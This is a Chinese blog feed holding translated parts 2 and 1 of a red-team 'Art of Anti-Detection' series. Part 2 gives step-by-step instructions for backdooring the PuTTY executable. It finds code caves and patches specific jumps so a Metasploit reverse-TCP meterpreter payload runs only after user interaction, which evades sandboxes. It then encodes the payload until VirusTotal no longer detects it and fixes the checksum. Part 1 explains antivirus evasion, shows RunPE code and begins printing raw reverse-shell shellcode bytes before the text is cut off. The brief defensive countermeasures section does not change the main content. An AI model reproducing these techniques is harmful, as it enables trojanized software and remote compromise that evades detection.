<h3 id="地址空间布局随机化">地址空间布局随机化</h3><p>（ASLR）是一种计算机安全技术，主要用于防止缓冲区溢出攻击。防止攻击者精确的跳转到内存中的某个特定漏洞地址空间地址实现漏洞利用，ASLR随机布局进程内存的关键数据区域的地址空间位置，包括可执行文件的基地址以及栈，堆和相关库的地址。</p>
<h3 id="Code_Caves">Code Caves</h3><p>Code Caves是一个程序写入另一个进程的内存的一段代码。这段代码可以通过在目标进程内创建远程线程来执行。代码的Code Caves通常是对代码的脚本函数的一部分的引用，该脚本函数具有注入自定义指令的能力。例如，如果脚本的内存允许5个字节，并且只使用3个字节，则剩余的2个字节可以用于向脚本添加外部代码, 这就是所谓的code cave。</p>
<h3 id="校验和">校验和</h3><p>校验和是对一段数据进行计算得到的一段小尺寸的数据，目的是检测可能在传输或存储过程中引入的错误。通常应用于安装文件从下载服务器收到安装文件的场景。就其本身而言，校验和通常用于验证数据完整性，但并不依赖于校验和来验证数据的真实性。</p>
<h2 id="0x02_主要方法">0x02 主要方法</h2><p>本文所有实现和示例都将使用putty SSH客户端实现。选择putty作为后门实践的宿主原因有很多，其中之一是putty是一个使用多个库和Windows API原生的C++客户端，另一个原因是使用SSH客户端作为后门将很难被注意到，因为putty客户端本身需要使用tcp连接。可以避免被蓝队网络监控发现，使用的后门代码是metasploit项目中Stephen Fever的反向TCP meterpreter shellcode。主要目标是将meterpreter shellcode注入目标PE文件，同时不破坏程序的实际功能。注入的shellcode将在新线程上执行，并将尝试持续连接到服务端。在执行所有这些操作时，另一个目标是使检测分数保持尽可能低的水平。<br>在PE文件中植入后门的常用方法包括4个主要步骤。</p>
<ul>
<li>1）为后门代码寻找可用空间</li>
<li>2）劫持程序执行流程</li>
<li>3）注入后门代码</li>
<li>4）恢复执行流程<br>在每个步骤中，都有很多细节的关键东西，这些细节保证了后门的隐蔽性防止被检测。</li>
</ul>
<h3 id="可用空间问题">可用空间问题</h3><p>第一步需要找到一块可用的空间，在PE文件中找到合适空间插入后门代码非常重要，被插入后门后的PE文件威胁检测分数很大程序上取决于如何在可用空间插入后门代码，一般有两种方式解决空间空间问题：</p>
<h4 id="1）添加一个新的section">1）添加一个新的section</h4><p>与另一种方法相比，此方法在检测分数上有更多缺点，但是通过添加一个新的section，对将要植入的后门代码没有大小限制。<br>通过使用反汇编工具或如LordPE的PE编辑器，可以通过添加新的section header来增加所有PE文件大小，下面是putty可执行文件的节表，通过PE编辑器，增加一个名称为NewSec大小为1000字节新section。</p>
<div align="center"><br><img src="/img/anti_av2_putty_sections.png" align><br></div>

<p>创建新section时，必须将section flags设置为”Read/Write/Execute”，否则PE文件被映射到内存后shellcode不能正常运行。</p>
<div align="center"><br><img src="/img/anti_av2_sectionflags.png" align><br></div>

<p>添加节头后，需要调整文件大小，可以使用十六进制编辑器在文件末尾添加section大小的空字节实现。</p>
<div align="center"><br><img src="/img/anti_av2_sectionflags.png" align><br></div>

<p>完成上述操作后，建议运行添加新section后的可执行问价你，以防出现任何错误，如果可执行文件运行顺利，则可以在调试器上修改新section。</p>
<div align="center"><br><img src="/img/anti_av2_newsec.png" align><br></div>

<p>通过添加新section来解决空间问题，在反检测分数上几乎没有任何优势，几乎所有的反病毒软件都可以识别不常见的section，而对不常见的section赋予所有（Read/Write/Execute）权限肯定是非常可疑的。<br>即使在putty可执行文件中添加一个空的完整权限section，某些反病毒软件也会将其标记为恶意。</p>
<div align="center"><br><img src="/img/anti_av2_VirusTotal.png" align><br></div>

<h4 id="2）Code_Caves">2）Code Caves</h4><p>解决空间问题的第二种方法是使用目标可执行文件的Code Caves。几乎所有编译的二进制文件都有可以用于插入后门代码的Code Caves。由于使用原始PE可执行文件空间，使用Code Caves代替增加section有助于减小被反病毒产品判定为恶意代码的风险。而且PE文件的大小在后门程序结束时不会更改，但是这种方法也有一些缺点。<br>Code Caves的数量和大小因文件而异，但是与添加新节相比，通常没有太多空间。使用Code Caves时，应尽量减少后门代码的尺寸。另一个缺点是section flag，由于应用程序的执行流程将劫持到到Code Caves，因此包含Code Caves的部分应具有Execute权限，为了修改section中的代码需要write权限，即使使某些shellcode是以自修改方式编码或混淆的。<br>多个Code Caves的使用将有助于解决空间限制问题，同时将后门代码拆分为多个片段有助于减少检测分数，但不幸的是，更改段权限看起来依然很可疑。有高级方法可以在运行时修改内存区域权限，以避免直接更改section flag，但是由于这些方法需要定制的shellcode，编码和IAT解析技术，因此将在下一篇文章中讨论。<br>借助名为Cminer的工具，可以很容易地枚举二进制文件的所有Code Caves。使用./Cminer putty.exe 300命令，可以枚举大于300字节的Code Caves。</p>
<div align="center"><br><img src="/img/anti_av2_cminer1.png" align><br></div>

<p>在本例中有5个比较好的Code Caves。start address给出了Code Caves的虚拟内存地址（VMA）。这是PE文件加载到内存中时Code Caves的地址，file offest是以字节为单位的PE文件形式Code Caves的位置起始地址。</p>
<div align="center"><br><img src="/img/anti_av2_cminer2.png" align><br></div>

<p>似乎大多数Code Caves都在data section，但data部分没有execute section flag，因此需要进行更改。后门代码大约为400-500字节，因此第5个Code Caves应该绰绰有余。应将所选Code Caves的起始地址保存下来，将section flag更改为R/W/E，后门程序的第一步将完成了，现在该劫持代码执行流程了。</p>
<h3 id="劫持执行流程">劫持执行流程</h3><p>在本小结中，目标是通过修改目标可执行文件中的指令将执行流重定向到后门代码。关于如何选择要修改的指令，有一个重要的细节。所有二进制指令的大小均以字节为单位，为了跳转到后门代码地址，将使用5或6个字节的长跳转。因此，在patch二进制文件时，要修改的指令必须与长跳转指令具有相同的大小，否则被修改位置上一条或下一条指令将被破坏。<br>选择正确的位置来重定向执行对于绕过反病毒软件的动态和沙箱分析非常重要。如果直接重定向，则可能会被反病毒软件的动态分析阶段检测到重定向。</p>
<p><strong>通过用户交互隐藏</strong>：<br>绕过沙箱/动态分析首先想到的是延迟Shellcode的执行或设计可识别沙箱的Shellcode和触发机制。但在插入后门代码时，大多数时候没有太多空间可以在PE文件中添加这些额外的代码。此外，通过汇编级语言编写反检测机制也需要大量时间和专业的知识。<br>利用需要用户交互才能执行后门代码，只有在实际用户操作程序时，通过用户交互才重定向执行后门代码。如果可以正确实现此方法，则成功率将为%100，并且不会增加后门代码的大小。<br>Putty可执行UI上的“Open”按钮启动一个功能，该功能实际检查给定IP地址的有效性。</p>
<div align="center"><br><img src="/img/anti_av2_putty.png" align><br></div>

<p>如果IP地址字段值不为空且有效，它将启动连接功能尝试连接给定的IP地址。<br>如果客户端成功创建SSH会话，则会弹出一个新窗口并要求提供凭据。</p>
<div align="center"><br><img src="/img/anti_av2_puttyLogin.png" align><br></div><br>这将是发生重定向的关键，因为没有足够的反病毒产品能够克隆这种复杂的操作手法，因此不会通过沙箱和动态分析机制检测到植入的后门。<br>使用基础的逆向工程方法，例如跟随字符串和字符串引用，将不难找到connect函数的地址。客户端与给定IP建立连接后，将在显示的窗口中显示一个字符串”login as：”。该字符串将帮助我们找到connect函数的地址，IDA Pro在查找字符串引用方面做得很好。<br>为了找到 “login as:”字符串，可以通过在IDA中点击Views-&gt;Open Subviews-&gt;Strings。<br><br><div align="center"><br><img src="/img/anti_av2_idastring.png" align><br></div><br>找到字符串并双击后，IDA会在数据部分内部找到为字符串创建的所有交叉引用，按Ctrl + X将显示所有交叉引用，在函数中引用字符串并显现“login as:”字符串。<br><div align="center"><br><img src="/img/anti_av2_Screenshot_2.png" align><br></div>

<div align="center"><br><img src="/img/anti_av2_Screenshot_3.png" align><br></div>

<p>这就是要patch的指令，在进行任何更改之前，请备份该指令。在后门代码执行后，将再次使用它。</p>
<div align="center"><br><img src="/img/anti_av2_Screenshot_4.png" align><br></div><br>将PUSH 467C7C指令更改为JMP 0x47A478的后门程序的重定向已完成。请注意下一条指令地址，这一点很重要。执行后门代码后，它将用作返回地址。下一步将注入后门代码。<br><br>### 注入后门代码<br><br>在注入后门代码时，首先需要做的是在执行后门之前保存寄存器。所有寄存器中的每个值对于程序的执行都非常重要。通过在Code Caves的开头放置PUSHAD和PUSHFD指令，所有寄存器和寄存器标志都存储栈中。这些值将在执行后门代码后弹出，因此程序可以继续执行而不会出现任何问题。<br><br><div align="center"><br><img src="/img/anti_av2_savereg.png" align><br></div>

<p>如前所述，将使用的后门代码是metasploit项目中的meterpreter反向TCP Shell代码。但是shellcode几乎不需要更改。通常反向TCP Shellcode会尝试连接给定次数，如果连接失败，它将通过调用ExitProcess API调用来关闭进程。</p>
<div align="center"><br><img src="/img/anti_av2_dmet.png" align><br></div>

<p>问题是，如果到处理程序的连接失败，则putty客户端的执行将停止，现在修改每次连接失败时shellcode程序集的几行，shellcode就会重试连接到原始程序，并且shellcode的大小也会减小。</p>
<div align="center"><br><img src="/img/anti_av2_nmet.png" align><br></div>

<p>在汇编代码中进行必要的修改后，使用nasm -f bin stager_reverse_tcp_nx.asm命令对其进行编译。现在，可以使用反向TCP Shellcode，但不能直接使用它。目标是在新线程上执行shellcode。为了创建一个新的线程，需要有另一个shellcode进行CreateThread的API调用，该调用指向反向TCP shellcode。在Stephen Fever编写的metasploit项目中还有一个用于创建线程的shellcode，</p>
<div align="center"><br><img src="/img/anti_av2_CreateThread.png" align><br></div>

<p>将shellcode字节以十六进制格式放置在createthread.asm文件中后，即可使用nasm -f bin createthread.asm命令进行汇编。此时，可以将Shellcode插入到code cave中了，但是在插入Shellcode之前，应该对它进行编码，以绕过反病毒产品的静态/签名分析机制。由于大多数反病毒软件都能识别metasploit项目中的所有编码器，因此强烈建议使用自定义编码器。本文将不讨论这种自定义shellcode编码器的制作方法，因为这将是另一篇文章的主题，但是使用多个metasploit编码器也可能会起作用。在每个编码过程之后，建议以原始格式将编码的shellcode上传到virus total并检查检测分数。尝试每种组合，直到无法检测到为止，或者等待下一篇文章。<br>在对shellcode进行正确编码之后，是时候将其插入到code cave中了。选择PUSHFD下的指令，然后在调试器上按Ctrl + E，shellcode将以十六进制格式粘贴到此处。</p>
<div align="center"><br><img src="/img/anti_av2_Insert.png" align><br></div>

<p>使用xxd -ps createthread命令，以十六进制格式打印编码的createthread shellcode或使用十六进制编辑器打开shellcode并复制十六进制值。在将十六进制值粘贴到immunity 调试器时，请注意字节数限制，这些patch操作是使用immunity 调试器进行的，而immunity 调试器在粘贴以编辑代码窗口时具有字节数限制。它不会粘贴所有的shellcode，记住在“编辑代码”窗口中粘贴的shellcode的最后2个字节，在按下OK按钮之后，继续将字节粘贴到它们结束的位置，当所有的shellcode粘贴到代码中后，插入后门代码操作就做完了。</p>
<h3 id="恢复执行流程">恢复执行流程</h3><p>创建后门代码线程后，程序需要返回到原始程序执行流程执行，这意味着EIP应该跳回到将执行重定向到插入后门代码功能位置。但是在跳回该功能之前，应先恢复所有已保存的寄存器。</p>
<div align="center"><br><img src="/img/anti_av2_pop.png" align><br></div>

<p>通过在shellcode的末尾插入POPFD和POPAD指令，所有保存的寄存器都以相同的顺序从栈中弹出。弹出寄存器后，在跳回之前还需要再做一个思考。之前为了执行被劫持指令，将PUSH 467C7C指令替换为JMP 0x47A478，以便将程序的执行重定向到code cave。现在，需要将PUSH 467C7C指令放在最后，才能恢复被劫持的指令。最后通过插入JMP 0x41CB73指令将执行重定向到code cave的函数了，最后生成的代码应如下所示</p>
<div align="center"><br><img src="/img/anti_av2_end.png" align><br></div>

<p>最后，选择所有patch和插入的指令，按右键单击并复制到可执行文件。应该对已修改的每条指令执行此操作。将所有指令复制并保存到文件后，请关闭调试器并测试可执行文件，如果可执行文件运行顺利，则后门即可使用。<br>最后，建议修改最终文件的校验和，以保持文件的真实性而不显得可疑，这也可能会降低检测分数。</p>
<div align="center"><br><img src="/img/anti_av2_Screenshot_6.png" align><br></div>

<h2 id="0x03_结论与预防措施">0x03 结论与预防措施</h2><p>最后，当正确应用上述步骤后，可生成完全无法检测后门。针对以上的两种代码注入方式，下面给出这些相应技术的对策，这些策略可以帮助系统管理员、恶意软件记录器、反病毒与反恶意软件产品的开发人员。</p>
<h3 id="1）section权限检查">1）section权限检查</h3><p>在谈到后门文件时，section权限flag对于检测异常非常重要，除非编译器愿意，否则当前的编译器绝不会为该节设置完整权限，尤其是像.data或.rdata这样的数据节不应如此具有执行权限，例如.text之类的代码段也不应具有写权限，这些异常应被视为可疑行为。</p>
<h3 id="2）异常section识别">2）异常section识别</h3><p>如果程序员不进行任何配置，编译器通常会创建5-6个通用类型的节，则所有安全产品都应具有识别不常见和可疑节的机制，如果节包含以下内容，则该机制可以查找节内的熵和数据对齐方式高熵和异常有序的数据，应该将其视为可疑的。</p>
<h3 id="3）签名检查">3）签名检查</h3><p>这种方法非常经典，但最有效，当下载新程序或任何可执行文件时，检查sha1签名是避免系统被植入后门文件的最安全方法。</p>
<h3 id="4）文件校验和检查">4）文件校验和检查</h3><p>如果可执行文件的校验和值与文件的实际校验和之间存在差异，则表明文件已被修改，安全产品和系统管理员应通过计算实际校验和并将其与文件的真实性进行比较来检查文件的真实性。</p>
<div align="center"><br><img src="/img/anti_av2_scan.png" align><br></div>

<h2 id="参考">参考</h2><p>[1] – <a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="external">https://github.com/secretsquirrel/the-backdoor-factory</a><br>[2] – <a href="https://www.shellterproject.com/" target="_blank" rel="external">https://www.shellterproject.com/</a><br>[3] – <a href="https://en.wikipedia.org/wiki/Red_team" target="_blank" rel="external">https://en.wikipedia.org/wiki/Red_team</a><br>[4] – <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">https://en.wikipedia.org/wiki/Address_space_layout_randomization</a><br>[5] – <a href="https://en.wikipedia.org/wiki/Code_cave" target="_blank" rel="external">https://en.wikipedia.org/wiki/Code_cave</a><br>[6] – <a href="https://en.wikipedia.org/wiki/Checksum" target="_blank" rel="external">https://en.wikipedia.org/wiki/Checksum</a></p>
<p><em>原文链接：<a href="https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/" target="_blank" rel="external">https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本文将会介绍用于安全测试红队目的几种制作PE（Portable Executable）文件后门的方法，如果需要完全理解本文，读者至少需要对x86汇编有一定的了解，同时需要熟悉调试器并且对PE文件格式有较高的理解。<br>]]>
    
    </summary>
    
      <category term="反病毒" scheme="http://www.youngroe.com/tags/%E5%8F%8D%E7%97%85%E6%AF%92/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[反检测的艺术1-反病毒软件及检测技术概述（翻译）]]></title>
    <link href="http://www.youngroe.com/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/"/>
    <id>http://www.youngroe.com/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/</id>
    <published>2020-09-03T11:39:22.000Z</published>
    <updated>2021-03-16T15:18:52.607Z</updated>
    <content type="html"><![CDATA[<p>本篇文章将介绍对抗最新反病毒软件静态检测、动态检测及启发式分析最有效的方法。其中一些已经是公开并被大众所熟知的方法，但是仍然有一些方法和绕过技巧是实现完全不可被检测（FUD,Fully Undetectable）恶意代码的关键，同时恶意代码的大小与其反检测能力同等重要，因此在实现这些反检测方法的时候我会努力让恶意代码的文件大小尽可能的小。本文也将介绍反病毒软件及Windows操作系统的内部原理，因此读者最好具备一定的C/C++及汇编语言基础同时对PE文件结构有一定的了解<br><a id="more"></a></p>
<h2 id="0x00_介绍">0x00 介绍</h2><p>反检测方法应该针对不同种类的恶意代码有不同的方法，本文介绍的所有反检测方法可以适用于所有种类的恶意代码但是本文侧重于stager meterpreter类型载荷，因为meterpreter能够做所有其他恶意代码能够做的事情，通过meterpreter会话可以做很多事情，包括权限提升、窃取凭据、操作进程/注册表，在利用漏洞后能够进行更多操作，meterpreter也拥有非常活跃的社区，在安全研究人员中很受欢迎。</p>
<h2 id="0x01_相关术语">0x01 相关术语</h2><h3 id="基于特征码的检测技术">基于特征码的检测技术</h3><p>传统反病毒软件严重依赖基于特征码的检测技术检测恶意代码。一般，当恶意代码达到反病毒公司后，将交由恶意代码研究人员或者动态分析系统进行分析，一旦被确定为恶意代码，就会提取该恶意代码的特征码并将特征码添加到反病毒软件数据库中。</p>
<h3 id="静态分析">静态分析</h3><p>静态分析是在没有实际执行程序的情况下对程序进行分析的技术。在大多数情况下，是对软件源代码的某些版本进行分析，在某些情况下也会对目标源码的某些形式进行分析。</p>
<h3 id="动态分析">动态分析</h3><p>动态分析是在真实或者虚拟的计算机上执行程序进行分析。为了提高动态分析的有效性，必须对目标程序产生足够的输入让目标程序产生一些有趣的行为。</p>
<h3 id="沙盒">沙盒</h3><p>在计算机安全中沙盒是一种隔离运行中程序的一种安全机制。通常用于执行未经测试或者不受信任的风险程序和代码，可能来自未经验证或者不受信任的第三方供应商、网站或者用户，通过沙盒执行可以避免损害主机或者操作系统。</p>
<h3 id="启发式分析">启发式分析</h3><p>很多反病毒软件采用启发式分析检测目前未知病毒和已知病毒变种。启发式分析是一种基于专家的分析系统，使用各种规则和权重确定各种威胁和风险的安全性。多标准分析（MCA）是其中一种衡量手段，启发式分析不同于静态分析，静态分析依赖于自身的数据和统计信息。</p>
<h3 id="熵">熵</h3><p> 在计算机科学中，熵是操作系统或者应用程序收集的用于密码学或者其他需要随机数据用途的随机性的一种衡量方式。这种随机性一般来源于硬件，如鼠标移动或者专用的硬件随机数生成器的。熵过低可能会对计算机性能或者安全性造成伤害。</p>
<h2 id="0x02_常用反检测方法">0x02 常用反检测方法</h2><p>为了降低恶意代码被检测的风险，首先考虑使用的方式是加密程序、打包程序或者代码混淆。这些反检测技术和工具仍然可以绕过很多反病毒软件，但随着网络安全领域的进步，大多数的工具和方法已经过时并且无法生成完全不被检测的恶意代码。但是为了理解这些技术和工具的内部工作原理，这里还将对其进行简要描述。</p>
<h3 id="代码混淆">代码混淆</h3><p>代码混淆可以定义为在不破坏实际功能的情况下对二进制程序的源代码进行混淆的一种方法，这使静态分析更加困难，同时还改变二进制代码的哈希签名。混淆只需添加几行垃圾代码或更改指令的执行顺序即可实现。这种方法可以绕过数量可观的反病毒软件，但要取决于您混淆了多少。</p>
<h3 id="压缩壳工具">压缩壳工具</h3><p>压缩壳工具是压缩可执行文件并将压缩后的数据与解压缩代码合并为单个可执行文件的一种程序。当执行被压缩壳压缩的程序时，解压缩代码将在执行之前从压缩的代码重新创建原始代码。在大多数情况下，这对原始程序是透明的，因此可以与原始文件完全相同的方式使用压缩的可执行文件。当反病毒软件扫描被打包压缩的恶意代码时，它需要确定压缩算法并将其解压缩。由于压缩后的文件较难分析，因此恶意软件作者对压缩壳工具表现出了浓厚的兴趣。</p>
<h3 id="加密壳工具">加密壳工具</h3><p>加密壳工具是对给定二进制文件进行加密的程序，以使其难以分析或者进行逆向工程。被加密壳打包的程序优两部分组成：builder和stub，builder仅对给定的二进制文件进行加密并将其放置在stub中，stub是加密壳中最重要的部分，当我们执行被加密壳打包的二进制文件时，第一个stub运行并解密原始二进制文件到内存，然后通过RunPE方法在内存中执行二进制文件（在大多数情况下）。</p>
<div align="center"><br><img src="/img/anti_av_crypters.png" align><br></div>

<h2 id="0x03_加密壳压缩壳所面临的问题">0x03 加密壳压缩壳所面临的问题</h2><p>在介绍最有效反检测技术之前，已知的反检测技术其实所面临的问题其实很少。但是现在的反病毒公司已经意识到了这种危险，现在他们不仅扫描恶意代码的特征和有害行为，还在扫描加密壳和压缩壳的特征。与检测恶意代码相比，检测加密壳和压缩壳相对容易，因为它们都必须做某些可疑的事情，例如解密加密的PE文件并在内存中执行。</p>
<h3 id="PE注入">PE注入</h3><p>为了说明PE映像如何在内存中的执行，本文将会讲解Windows如何加载PE文件。在编译PE文件时，编译器会将主模块基地址设置为0x00400000，而编译过程中所有的地址指针和长跳转指令处的地址都是根据主模块地址计算的，在编译后期，编译器会在PE文件中创建一个重定位表，重定位表中包含的指令的地址取决于映像基址，例如地址指针和长跳转指令。<br>在执行PE映像时，操作系统会检查PE映像的默认基地址的可用性，如果默认基地址不可用，则操作系统会在启动过程系统加载程序需要之前，将PE映像加载到内存中的随机可用地址上。然后通过重定位表调整内存中的绝对地址，系统加载程序会修复所有与绝对地址相关的指令，然后启动这个被挂起的进程。这种机制称为地址随机化ASLR。<br>为了在内存上执行PE映像，加密壳需要解析PE头并重新定位绝对地址，同时必须模拟系统加载器，这种行为是非常可疑的。几乎每次当我们分析用C或其他高级语言编写的加密壳的时候，我们都会发现使用了NtUnmapViewOfSection或者ZwUnmapViewOfSection这两个Windows系统API，这两个函数的作用为从虚拟内存中卸载某些sections的映射，它们在RunPE类内存执行技术中起着非常大的作用，几乎%90的加密壳都会使用这种技术。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xNtUnmapViewOfSection = NtUnmapViewOfSection<span class="list">(<span class="keyword">GetProcAddress</span><span class="list">(<span class="keyword">GetModuleHandleA</span><span class="list">(<span class="string">"ntdll.dll"</span>)</span>, <span class="string">"NtUnmapViewOfSection"</span>)</span>)</span><span class="comment">;</span></span><br><span class="line">xNtUnmapViewOfSection<span class="list">(<span class="keyword">PI</span>.hProcess, PVOID<span class="list">(<span class="keyword">dwImageBase</span>)</span>)</span><span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>当然，反病毒软件不能仅仅对使用这些Windows API函数的程序都判定为恶意代码，但使用这些函数的顺序非常重要。一小部分的加密壳（通常是用汇编语言编写）不使用这些函数并手动执行重定位，之前这种方式非常有效，但后续这种方法也将可能会失效，因为从逻辑上讲，正常程序都不会模拟系统加载器。另一个缺点是输入文件的熵极大增加，因为对整个PE文件进行了加密，熵将不可避免地上升，当反病毒软件检测到PE文件异常熵时，它们可能会将文件标记为可疑文件。</p>
<div align="center"><br><img src="/img/anti_av_suspicious.png" align><br></div>

<h3 id="完美的方法">完美的方法</h3><p>通过加密恶意代码实现反检测的概念很聪明，但是执行解密功能的函数应该适当地的做混淆处理，同时内存中执行解密代码的时候，我们必须在不执行重定位的情况下进行加密，而且还必须有一种检测执行环境的功能的检测机制恶意代码是否在沙盒中执行，如果检测机制检测到反病毒软件正在分析恶意软件，则不应执行解密功能。与其加密整个PE文件不如只加密shellcode或仅二进制文件的.text节，这样可以使熵值较低，也不用修改PE头部和其他节。<br>下面是恶意代码的执行流程图。</p>
<div align="center"><br><img src="/img/anti_av_malware_flow.png" align><br></div><br>在环境检测函数中将会检查当前恶意代码是否在沙盒中被动态分析，如果检测到正在沙盒中被动态分析则继续执行main函数或者直接崩溃，如果未检测到沙盒环境则执行解密shellcode函数。<br>原始reverse tcp meterpreter的shellcode如下：<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Shellcode[] = &#123;</span><br><span class="line">  <span class="number">0xfc</span>, <span class="number">0xe8</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x64</span>,</span><br><span class="line">  <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0x30</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x0c</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x14</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x28</span>,</span><br><span class="line">  <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x26</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, <span class="number">0x02</span>, <span class="number">0x2c</span>,</span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>, <span class="number">0xc7</span>, <span class="number">0xe2</span>, <span class="number">0xf2</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>,</span><br><span class="line">  <span class="number">0x10</span>, <span class="number">0x8b</span>, <span class="number">0x4a</span>, <span class="number">0x3c</span>, <span class="number">0x8b</span>, <span class="number">0x4c</span>, <span class="number">0x11</span>, <span class="number">0x78</span>, <span class="number">0xe3</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd1</span>,</span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x8b</span>, <span class="number">0x59</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x8b</span>, <span class="number">0x49</span>, <span class="number">0x18</span>, <span class="number">0xe3</span>, <span class="number">0x3a</span>, <span class="number">0x49</span>,</span><br><span class="line">  <span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x8b</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xac</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0xf6</span>, <span class="number">0x03</span>, <span class="number">0x7d</span>, <span class="number">0xf8</span>, <span class="number">0x3b</span>, <span class="number">0x7d</span>, <span class="number">0x24</span>, <span class="number">0x75</span>,</span><br><span class="line">  <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x0c</span>, <span class="number">0x4b</span>, <span class="number">0x8b</span>,</span><br><span class="line">  <span class="number">0x58</span>, <span class="number">0x1c</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x8b</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>,</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x5b</span>, <span class="number">0x5b</span>, <span class="number">0x61</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x51</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x5f</span>, <span class="number">0x5f</span>, <span class="number">0x5a</span>,</span><br><span class="line">  <span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xeb</span>, <span class="number">0x8d</span>, <span class="number">0x5d</span>, <span class="number">0x68</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x77</span>,</span><br><span class="line">  <span class="number">0x73</span>, <span class="number">0x32</span>, <span class="number">0x5f</span>, <span class="number">0x54</span>, <span class="number">0x68</span>, <span class="number">0x4c</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0xb8</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x29</span>, <span class="number">0xc4</span>, <span class="number">0x54</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0x29</span>, <span class="number">0x80</span>, <span class="number">0x6b</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x6a</span>, <span class="number">0x05</span>, <span class="number">0x68</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x68</span>, <span class="number">0x02</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x5c</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x40</span>, <span class="number">0x50</span>, <span 